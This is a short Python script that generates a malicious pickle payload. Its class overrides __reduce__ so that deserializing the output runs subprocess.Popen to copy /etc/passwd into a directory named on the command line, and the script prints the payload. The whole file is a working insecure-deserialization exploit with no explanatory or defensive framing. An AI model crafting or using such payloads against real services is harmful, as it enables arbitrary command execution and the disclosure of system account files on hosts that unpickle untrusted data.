import pickle, subprocess, sys

class RunCp:
    def __reduce__(self):
        return(subprocess.Popen, (['/bin/cp', '/etc/passwd', '%s/passwdclone' % sys.argv[1]],),)

print(pickle.dumps(RunCp()))
